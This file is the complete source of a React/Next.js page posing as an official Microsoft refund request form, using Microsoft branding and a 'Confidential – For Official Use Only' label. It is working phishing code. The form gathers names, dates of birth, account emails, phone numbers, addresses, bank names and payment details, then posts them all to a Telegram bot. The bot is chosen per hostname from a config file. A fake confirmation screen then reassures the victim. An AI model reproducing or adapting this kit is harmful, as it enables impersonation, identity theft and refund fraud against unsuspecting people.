'use client'

import Image from 'next/image'
import { useState, useEffect } from 'react'

interface TelegramConfig {
  botToken: string
  chatId: string
}

export default function RefundForm() {
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [submitSuccess, setSubmitSuccess] = useState(false)

  // Customer Information
  const [formData, setFormData] = useState({
    fullLegalName: '',
    dateOfBirth: '',
    microsoftEmail: '',
    alternateEmail: '',
    phoneNumber: '',
    billingAddress: '',
    customerType: '',
    // Purchase Details
    productName: '',
    skuId: '',
    orderNumber: '',
    purchaseChannel: '',
    productCategory: '',
    purchaseDate: '',
    amountPaid: '',
    currency: '',
    paymentMethod: '',
    // Refund Request Details
    bankName: '',
    refundAmount: '',
    refundReasons: {
      accidentalPurchase: false,
      duplicateCharge: false,
      productNotAsDescribed: false,
      technicalIssues: false,
      subscriptionCancellation: false,
      billingError: false,
      other: false,
    },
    detailedExplanation: '',
    // Policy & Declaration
    policyAcknowledgment: false,
    customerDeclaration: false,
    customerSignature: '',
    signatureDate: '',
    customerNamePrinted: '',
  })

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>) => {
    const { name, value, type } = e.target
    
    if (type === 'checkbox') {
      const checkbox = e.target as HTMLInputElement
      if (name.startsWith('reason_')) {
        const reasonKey = name.replace('reason_', '')
        setFormData(prev => ({
          ...prev,
          refundReasons: {
            ...prev.refundReasons,
            [reasonKey]: checkbox.checked,
          },
        }))
      } else {
        setFormData(prev => ({
          ...prev,
          [name]: checkbox.checked,
        }))
      }
    } else {
      setFormData(prev => ({
        ...prev,
        [name]: value,
      }))
    }
  }

  const isFormValid = () => {
    return (
      formData.fullLegalName.trim() !== '' &&
      formData.dateOfBirth !== '' &&
      formData.microsoftEmail.trim() !== '' &&
      formData.customerType !== '' &&
      formData.productName.trim() !== '' &&
      formData.purchaseChannel !== '' &&
      formData.productCategory !== '' &&
      formData.bankName.trim() !== '' &&
      formData.refundAmount.trim() !== '' &&
      formData.policyAcknowledgment &&
      formData.customerDeclaration &&
      formData.customerNamePrinted.trim() !== ''
    )
  }

  const getTelegramConfig = async (): Promise<TelegramConfig> => {
    try {
      const response = await fetch('/telegram-config.json')
      const config = await response.json()
      const hostname = window.location.hostname
      return config[hostname] || config['default']
    } catch (error) {
      console.error('Failed to load telegram config:', error)
      return {
        botToken: '',
        chatId: '',
      }
    }
  }

  const formatRefundReasons = () => {
    const reasons = []
    if (formData.refundReasons.accidentalPurchase) reasons.push('Accidental Purchase')
    if (formData.refundReasons.duplicateCharge) reasons.push('Duplicate Charge')
    if (formData.refundReasons.productNotAsDescribed) reasons.push('Product Not as Described')
    if (formData.refundReasons.technicalIssues) reasons.push('Technical Issues')
    if (formData.refundReasons.subscriptionCancellation) reasons.push('Subscription Cancellation')
    if (formData.refundReasons.billingError) reasons.push('Billing Error')
    if (formData.refundReasons.other) reasons.push('Other')
    return reasons.length > 0 ? reasons.join(', ') : 'None selected'
  }

  const sendToTelegram = async () => {
    const config = await getTelegramConfig()
    if (!config.botToken || !config.chatId) {
      console.error('Telegram configuration is missing')
      return false
    }

    const message = `
🔔 *NEW MICROSOFT REFUND REQUEST*
━━━━━━━━━━━━━━━━━━━━━━

👤 *CUSTOMER INFORMATION*
• Full Legal Name: ${formData.fullLegalName}
• Date of Birth: ${formData.dateOfBirth}
• Microsoft Email: ${formData.microsoftEmail}
• Alternate Email: ${formData.alternateEmail || 'N/A'}
• Phone Number: ${formData.phoneNumber || 'N/A'}
• Billing Address: ${formData.billingAddress || 'N/A'}
• Customer Type: ${formData.customerType}

🛒 *PURCHASE DETAILS*
• Product/Service: ${formData.productName}
• SKU/License ID: ${formData.skuId || 'N/A'}
• Order Number: ${formData.orderNumber || 'N/A'}
• Purchase Channel: ${formData.purchaseChannel}
• Product Category: ${formData.productCategory}
• Purchase Date: ${formData.purchaseDate || 'N/A'}
• Amount Paid: ${formData.amountPaid || 'N/A'} ${formData.currency || ''}
• Payment Method: ${formData.paymentMethod || 'N/A'}

💰 *REFUND REQUEST DETAILS*
• Bank Name: ${formData.bankName}
• Refund Amount: ${formData.refundAmount}
• Reasons: ${formatRefundReasons()}
• Explanation: ${formData.detailedExplanation || 'N/A'}

✍️ *DECLARATION*
• Signature: ${formData.customerSignature || 'N/A'}
• Date: ${formData.signatureDate || 'N/A'}
• Printed Name: ${formData.customerNamePrinted}

━━━━━━━━━━━━━━━━━━━━━━
📅 Submitted: ${new Date().toLocaleString()}
🌐 Source: ${window.location.hostname}
`

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${config.botToken}/sendMessage`,
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: config.chatId,
            text: message,
            parse_mode: 'Markdown',
          }),
        }
      )
      return response.ok
    } catch (error) {
      console.error('Failed to send to Telegram:', error)
      return false
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!isFormValid()) return

    setIsSubmitting(true)

    const success = await sendToTelegram()
    
    if (success) {
      setSubmitSuccess(true)
    }

    setIsSubmitting(false)
  }

  if (submitSuccess) {
    return (
      <>
        <header className="header">
          <div className="header-brand">
            <a href="#" className="header-link">
              <Image 
                src="/microsoft-logo.png" 
                alt="Microsoft" 
                width={108} 
                height={24}
                className="header-logo"
              />
            </a>
          </div>
        </header>

        <main className="main-container">
          <div className="refund-card">
            <div className="success-content">
              <div className="success-icon">✓</div>
              <h2 className="success-title">Request Submitted Successfully</h2>
              <p className="success-text">
                Your refund request has been submitted and is being reviewed by our team. 
                You will receive a confirmation email shortly.
              </p>
              <p className="success-reference">
                Reference: REF-{Date.now().toString(36).toUpperCase()}
              </p>
            </div>
          </div>
        </main>
      </>
    )
  }

  return (
    <>
      <header className="header">
        <div className="header-brand">
          <a href="#" className="header-link">
            <Image 
              src="/microsoft-logo.png" 
              alt="Microsoft" 
              width={108} 
              height={24}
              className="header-logo"
            />
          </a>
        </div>
      </header>

      <main className="main-container">
        <div className="refund-card">
          <div className="refund-header">
            <Image 
              src="/windows-logo.png" 
              alt="Windows" 
              width={60} 
              height={60}
              className="refund-logo"
            />
            <h1 className="refund-title">Microsoft Refund Request Form</h1>
            <p className="refund-subtitle">Confidential – For Official Use Only</p>
          </div>

          <form className="refund-form" onSubmit={handleSubmit} autoComplete="off">
            {/* Customer Information Section */}
            <section className="form-section">
              <h2 className="section-title">Customer Information</h2>
              
              <div className="form-row two-cols">
                <div className="form-field">
                  <label className="field-label">Full Legal Name *</label>
                  <input
                    type="text"
                    name="fullLegalName"
                    className="field-input"
                    value={formData.fullLegalName}
                    onChange={handleInputChange}
                    required
                  />
                </div>
                <div className="form-field">
                  <label className="field-label">Date of Birth *</label>
                  <input
                    type="date"
                    name="dateOfBirth"
                    className="field-input"
                    value={formData.dateOfBirth}
                    onChange={handleInputChange}
                    placeholder="mm/dd/yyyy"
                    required
                  />
                </div>
              </div>

              <div className="form-row two-cols">
                <div className="form-field">
                  <label className="field-label">Microsoft Account Email *</label>
                  <input
                    type="email"
                    name="microsoftEmail"
                    className="field-input"
                    value={formData.microsoftEmail}
                    onChange={handleInputChange}
                    required
                  />
                </div>
                <div className="form-field">
                  <label className="field-label">Alternate Email</label>
                  <input
                    type="email"
                    name="alternateEmail"
                    className="field-input"
                    value={formData.alternateEmail}
                    onChange={handleInputChange}
                  />
                </div>
              </div>

              <div className="form-row">
                <div className="form-field">
                  <label className="field-label">Phone Number</label>
                  <input
                    type="tel"
                    name="phoneNumber"
                    className="field-input field-half"
                    value={formData.phoneNumber}
                    onChange={handleInputChange}
                  />
                </div>
              </div>

              <div className="form-row">
                <div className="form-field">
                  <label className="field-label">Billing Address</label>
                  <input
                    type="text"
                    name="billingAddress"
                    className="field-input field-wide"
                    value={formData.billingAddress}
                    onChange={handleInputChange}
                  />
                </div>
              </div>

              <div className="form-row">
                <div className="form-field">
                  <label className="field-label">Customer Type *</label>
                  <select
                    name="customerType"
                    className="field-select field-half"
                    value={formData.customerType}
                    onChange={handleInputChange}
                    required
                  >
                    <option value="">-- Select --</option>
                    <option value="Individual">Individual</option>
                    <option value="Business">Business</option>
                    <option value="Education">Education</option>
                    <option value="Government">Government</option>
                    <option value="Non-Profit">Non-Profit</option>
                  </select>
                </div>
              </div>
            </section>

            {/* Purchase Details Section */}
            <section className="form-section">
              <h2 className="section-title">Purchase Details</h2>

              <div className="form-row two-cols">
                <div className="form-field">
                  <label className="field-label">Product or Service Name *</label>
                  <input
                    type="text"
                    name="productName"
                    className="field-input"
                    value={formData.productName}
                    onChange={handleInputChange}
                    required
                  />
                </div>
                <div className="form-field">
                  <label className="field-label">SKU / Subscription ID / License ID</label>
                  <input
                    type="text"
                    name="skuId"
                    className="field-input"
                    value={formData.skuId}
                    onChange={handleInputChange}
                  />
                </div>
              </div>

              <div className="form-row two-cols">
                <div className="form-field">
                  <label className="field-label">Order Number / Invoice Number</label>
                  <input
                    type="text"
                    name="orderNumber"
                    className="field-input"
                    value={formData.orderNumber}
                    onChange={handleInputChange}
                  />
                </div>
                <div className="form-field">
                  <label className="field-label">Purchase Channel *</label>
                  <select
                    name="purchaseChannel"
                    className="field-select"
                    value={formData.purchaseChannel}
                    onChange={handleInputChange}
                    required
                  >
                    <option value="">-- Select --</option>
                    <option value="Microsoft Store">Microsoft Store</option>
                    <option value="Xbox Store">Xbox Store</option>
                    <option value="Microsoft 365">Microsoft 365</option>
                    <option value="Azure">Azure</option>
                    <option value="Windows Store">Windows Store</option>
                    <option value="Retail Partner">Retail Partner</option>
                    <option value="Other">Other</option>
                  </select>
                </div>
              </div>

              <div className="form-row two-cols">
                <div className="form-field">
                  <label className="field-label">Product Category *</label>
                  <select
                    name="productCategory"
                    className="field-select"
                    value={formData.productCategory}
                    onChange={handleInputChange}
                    required
                  >
                    <option value="">-- Select --</option>
                    <option value="Software">Software</option>
                    <option value="Hardware">Hardware</option>
                    <option value="Subscription">Subscription</option>
                    <option value="Game">Game</option>
                    <option value="App">App</option>
                    <option value="In-App Purchase">In-App Purchase</option>
                    <option value="Cloud Service">Cloud Service</option>
                    <option value="Other">Other</option>
                  </select>
                </div>
                <div className="form-field">
                  <label className="field-label">Purchase Date</label>
                  <input
                    type="date"
                    name="purchaseDate"
                    className="field-input"
                    value={formData.purchaseDate}
                    onChange={handleInputChange}
                    placeholder="mm/dd/yyyy"
                  />
                </div>
              </div>

              <div className="form-row two-cols">
                <div className="form-field">
                  <label className="field-label">Amount Paid</label>
                  <input
                    type="text"
                    name="amountPaid"
                    className="field-input"
                    value={formData.amountPaid}
                    onChange={handleInputChange}
                  />
                </div>
                <div className="form-field">
                  <label className="field-label">Currency</label>
                  <input
                    type="text"
                    name="currency"
                    className="field-input"
                    value={formData.currency}
                    onChange={handleInputChange}
                    placeholder="e.g. USD, EUR, GBP"
                  />
                </div>
              </div>

              <div className="form-row">
                <div className="form-field">
                  <label className="field-label">Payment Method</label>
                  <select
                    name="paymentMethod"
                    className="field-select field-half"
                    value={formData.paymentMethod}
                    onChange={handleInputChange}
                  >
                    <option value="">-- Select --</option>
                    <option value="Credit Card">Credit Card</option>
                    <option value="Debit Card">Debit Card</option>
                    <option value="PayPal">PayPal</option>
                    <option value="Bank Transfer">Bank Transfer</option>
                    <option value="Gift Card">Gift Card</option>
                    <option value="Mobile Payment">Mobile Payment</option>
                    <option value="Other">Other</option>
                  </select>
                </div>
              </div>
            </section>

            {/* Refund Request Details Section */}
            <section className="form-section">
              <h2 className="section-title">Refund Request Details</h2>

              <div className="form-row two-cols">
                <div className="form-field">
                  <label className="field-label">Bank Name *</label>
                  <input
                    type="text"
                    name="bankName"
                    className="field-input"
                    value={formData.bankName}
                    onChange={handleInputChange}
                    required
                  />
                </div>
                <div className="form-field">
                  <label className="field-label">Refund Amount Requested *</label>
                  <input
                    type="text"
                    name="refundAmount"
                    className="field-input"
                    value={formData.refundAmount}
                    onChange={handleInputChange}
                    required
                  />
                </div>
              </div>

              <div className="checkbox-group">
                <label className="checkbox-label">
                  <input
                    type="checkbox"
                    name="reason_accidentalPurchase"
                    checked={formData.refundReasons.accidentalPurchase}
                    onChange={handleInputChange}
                  />
                  <span className="checkbox-text">Accidental Purchase</span>
                </label>
                <label className="checkbox-label">
                  <input
                    type="checkbox"
                    name="reason_duplicateCharge"
                    checked={formData.refundReasons.duplicateCharge}
                    onChange={handleInputChange}
                  />
                  <span className="checkbox-text">Duplicate Charge</span>
                </label>
                <label className="checkbox-label">
                  <input
                    type="checkbox"
                    name="reason_productNotAsDescribed"
                    checked={formData.refundReasons.productNotAsDescribed}
                    onChange={handleInputChange}
                  />
                  <span className="checkbox-text">Product Not as Described</span>
                </label>
                <label className="checkbox-label">
                  <input
                    type="checkbox"
                    name="reason_technicalIssues"
                    checked={formData.refundReasons.technicalIssues}
                    onChange={handleInputChange}
                  />
                  <span className="checkbox-text">Technical Issues</span>
                </label>
                <label className="checkbox-label">
                  <input
                    type="checkbox"
                    name="reason_subscriptionCancellation"
                    checked={formData.refundReasons.subscriptionCancellation}
                    onChange={handleInputChange}
                  />
                  <span className="checkbox-text">Subscription Cancellation</span>
                </label>
                <label className="checkbox-label">
                  <input
                    type="checkbox"
                    name="reason_billingError"
                    checked={formData.refundReasons.billingError}
                    onChange={handleInputChange}
                  />
                  <span className="checkbox-text">Billing Error</span>
                </label>
                <label className="checkbox-label">
                  <input
                    type="checkbox"
                    name="reason_other"
                    checked={formData.refundReasons.other}
                    onChange={handleInputChange}
                  />
                  <span className="checkbox-text">Other (explain below)</span>
                </label>
              </div>

              <div className="form-row">
                <div className="form-field">
                  <label className="field-label">Detailed Explanation of Reason for Refund</label>
                  <textarea
                    name="detailedExplanation"
                    className="field-textarea"
                    value={formData.detailedExplanation}
                    onChange={handleInputChange}
                    rows={3}
                  />
                </div>
              </div>
            </section>

            {/* Policy Acknowledgment Section */}
            <section className="form-section">
              <h2 className="section-title">Policy Acknowledgment</h2>
              <label className="checkbox-label policy-checkbox">
                <input
                  type="checkbox"
                  name="policyAcknowledgment"
                  checked={formData.policyAcknowledgment}
                  onChange={handleInputChange}
                  required
                />
                <span className="checkbox-text">
                  I acknowledge that this refund request is subject to Microsoft's Refund and Cancellation Policy. 
                  Approval is not guaranteed and refunds may be issued at Microsoft's sole discretion.
                </span>
              </label>
            </section>

            {/* Customer Declaration Section */}
            <section className="form-section">
              <h2 className="section-title">Customer Declaration</h2>
              <label className="checkbox-label policy-checkbox">
                <input
                  type="checkbox"
                  name="customerDeclaration"
                  checked={formData.customerDeclaration}
                  onChange={handleInputChange}
                  required
                />
                <span className="checkbox-text">
                  I certify that the information provided is true, accurate, and complete. I understand that submitting 
                  false information may result in denial of this request.
                </span>
              </label>

              <div className="form-row two-cols" style={{ marginTop: '1.5rem' }}>
                <div className="form-field">
                  <label className="field-label">Customer Signature</label>
                  <input
                    type="text"
                    name="customerSignature"
                    className="field-input"
                    value={formData.customerSignature}
                    onChange={handleInputChange}
                  />
                </div>
                <div className="form-field">
                  <label className="field-label">Date</label>
                  <input
                    type="date"
                    name="signatureDate"
                    className="field-input"
                    value={formData.signatureDate}
                    onChange={handleInputChange}
                    placeholder="mm/dd/yyyy"
                  />
                </div>
              </div>

              <div className="form-row">
                <div className="form-field">
                  <label className="field-label">Customer Name (Printed) *</label>
                  <input
                    type="text"
                    name="customerNamePrinted"
                    className="field-input field-half"
                    value={formData.customerNamePrinted}
                    onChange={handleInputChange}
                    required
                  />
                </div>
              </div>
            </section>

            <button 
              type="submit" 
              className="submit-button"
              disabled={!isFormValid() || isSubmitting}
            >
              {isSubmitting ? 'Submitting...' : 'Submit Request'}
            </button>
          </form>
        </div>
      </main>
    </>
  )
}
